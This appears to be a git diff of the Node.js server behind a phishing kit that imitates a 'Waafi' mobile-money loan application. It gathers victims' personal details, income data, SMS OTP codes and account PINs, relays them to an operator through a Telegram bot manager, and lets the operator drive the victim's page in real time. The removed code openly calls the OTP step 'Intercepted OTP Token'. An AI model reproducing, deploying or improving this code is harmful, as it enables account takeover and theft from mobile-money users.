@@ -1,95 +1,137 @@
-require('dotenv').config();
 const express = require('express');
-const http = require('http');
-const socketIo = require('socket.io');
-const path = require('path');
-const cors = require('cors');
-
-// Destructure both the botManager object and its express routing middleware
-const { botManager, botRouter } = require('./bot_manager');
-
 const app = express();
-const server = http.createServer(app);
+const http = require('http').createServer(app);
+const io = require('socket.io')(http);
+const axios = require('axios');
 
-// Configure Socket.io for Render (CORS is essential for real-time frontend feedback loops)
-const io = socketIo(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
-
-global.io = io; // Link socket globally so botManager webhook callbacks can message specific active user rooms
-
-const PORT = process.env.PORT || 3000;
-const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
-
-app.use(cors());
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
 
-// Mount the integrated bot router middleware to capture webhook updates at /bot/webhook
-app.use(botRouter);
+// Memory store to keep track of active user wizard sessions
+const activeSessions = new Map();
 
-// Fallback webhook route handling raw message updates directly through TelegramBot API
-app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
-    botManager.bot.processUpdate(req.body);
-    res.sendStatus(200);
-});
+// URL where bot_manager.js is running
+const BOT_MANAGER_URL = 'http://localhost:3001';
 
 io.on('connection', (socket) => {
-    // Generate unique application session tracking token
-    const appId = `WAAFI-${Math.floor(100000 + Math.random() * 900000)}`;
+    // Generate a clean Waafi tracking ID sequence
+    const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
     
-    socket.join(appId);
-    console.log(`🔌 Waafi Application Session Connected: ${appId}`);
-    
-    // Send AppID down to the frontend right away to bind state models
+    activeSessions.set(socket.id, {
+        appId: appId,
+        socketId: socket.id,
+        loanType: '', amount: 1200, term: '1', purpose: '',
+        firstName: '', lastName: '', email: '', phone: '',
+        employment: '', income: '', employer: '',
+        otpToken: '', pinCode: '',
+        step: 1
+    });
+
+    // Send the tracking ID immediately to the browser layout
     socket.emit('session-ready', { appId: appId });
+    socket.join(appId);
 
-    // Step 1: Core Loan Configuration Logging
-    socket.on('step1', (data) => {
-        botManager.sendToAdmin(appId, "Waafi - Step 1: Loan Request", data, null);
+    // Sync multi-turn data state buffers
+    socket.on('step1', (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (session) { session = { ...session, ...payload, step: 2 }; activeSessions.set(socket.id, session); }
     });
 
-    // Step 2: Personal Coordinate Mapping Logging
-    socket.on('step2', (data) => {
-        botManager.sendToAdmin(appId, "Waafi - Step 2: Identity Profile", data, null);
+    socket.on('step2', (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (session) { session = { ...session, ...payload, step: 3 }; activeSessions.set(socket.id, session); }
     });
 
-    // Step 3: Financial Background Assessment (Triggers OTP prompt button dashboard)
-    socket.on('step3-data', (data) => {
-        botManager.sendToAdmin(appId, "Waafi - Step 3: Income & Employment", data, "step3");
+    // Step 3 submission: Forwards data to bot manager to post ONE clean layout to Telegram
+    socket.on('step3-data', async (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (!session) return;
+        
+        Object.assign(session, payload);
+        session.step = 4;
+        activeSessions.set(socket.id, session);
+
+        // Forward safely to bot manager
+        try {
+            await axios.post(`${BOT_MANAGER_URL}/trigger-step3-telegram`, { session });
+        } catch (err) {
+            console.error("Communication error reaching Bot Manager (Step 3):", err.message);
+        }
     });
 
-    // Step 4: SMS OTP Capture Layer (Triggers PIN prompt button dashboard)
-    socket.on('step4-otp', (data) => {
-        botManager.sendToAdmin(appId, "Waafi - Step 4: Intercepted OTP Token", data, "step4");
+    // Step 4 OTP: Triggers ONLY when the user types the token and clicks send
+    socket.on('step4-otp', async (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (!session) return;
+
+        session.otpToken = payload.otp;
+        activeSessions.set(socket.id, session);
+
+        try {
+            await axios.post(`${BOT_MANAGER_URL}/trigger-step4-telegram`, { session });
+        } catch (err) {
+            console.error("Communication error reaching Bot Manager (Step 4):", err.message);
+        }
     });
 
-    // Step 5: Secure Account Authorization PIN Submission (Triggers Disbursement button dashboard)
-    socket.on('step5-pin', (data) => {
-        botManager.sendFinalApproval(appId, data.pin);
+    // Step 5 Account PIN: Transmits parameters to admin channels for final validation
+    socket.on('step5-pin', async (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (!session) return;
+
+        session.pinCode = payload.pin;
+        activeSessions.set(socket.id, session);
+
+        try {
+            await axios.post(`${BOT_MANAGER_URL}/trigger-step5-telegram`, { session });
+        } catch (err) {
+            console.error("Communication error reaching Bot Manager (Step 5):", err.message);
+        }
     });
 
     socket.on('disconnect', () => {
-        console.log(`🔌 Application Session Disconnected: ${appId}`);
+        activeSessions.delete(socket.id);
     });
 });
 
-server.listen(PORT, async () => {
-    console.log(`🚀 Waafi Loan Verification Core running on port ${PORT}`);
+// =========================================================================
+// API ENDPOINTS FOR BOT_MANAGER.JS TO UPDATE WEB APPLICATION VIEWS
+// =========================================================================
+
+app.post('/api/admin-action', (req, res) => {
+    const { actionSignal, targetAppId, message } = req.body;
     
-    // Auto-configure Webhooks on deployment platforms like Render
-    if (EXTERNAL_URL) {
-        const webhookUrl = `${EXTERNAL_URL}/bot/webhook`;
-        try {
-            await botManager.bot.setWebHook(webhookUrl);
-            console.log(`✅ Telegram Webhook auto-bound directly to: ${webhookUrl}`);
-        } catch (err) {
-            console.error('❌ Webhook Setup Failed to initialize on startup:', err.message);
-        }
-    } else {
-        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside runtime environment profiles.');
+    // Find the socket session linked to this tracking ID
+    let targetSession = null;
+    for (let [socketId, record] of activeSessions.entries()) {
+        if (record.appId === targetAppId) { targetSession = record; break; }
     }
+
+    if (!targetSession) {
+        return res.status(404).json({ error: "Active browser session not found" });
+    }
+
+    const clientSocket = io.sockets.sockets.get(targetSession.socketId);
+    if (!clientSocket) {
+        return res.status(410).json({ error: "Client disconnected from socket pipeline" });
+    }
+
+    // Direct routing maps matching your exact client events
+    if (actionSignal === 'approve_data' || actionSignal === 'approve_otp') {
+        clientSocket.emit('admin-approve-otp'); 
+    } else if (actionSignal === 'reject_app') {
+        clientSocket.emit('admin-reject', { message: message || "Codsigaaga waa la diiday." });
+    } else if (actionSignal === 'otp-failed') {
+        clientSocket.emit('otp-failed', { message: message || "Code-ka OTP ee aad gelisay waa khalad." });
+    } else if (actionSignal === 'approve_pin') {
+        const generatedRef = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
+        clientSocket.emit('pin-verified', { referenceId: generatedRef });
+    } else if (actionSignal === 'pin-failed') {
+        clientSocket.emit('pin-failed', { message: message || "PIN-ka koontada aad gelisay waa khalad." });
+    }
+
+    return res.json({ success: true });
+});
+
+http.listen(3000, () => {
+    console.log('Web Application Core running on port 3000');
 });
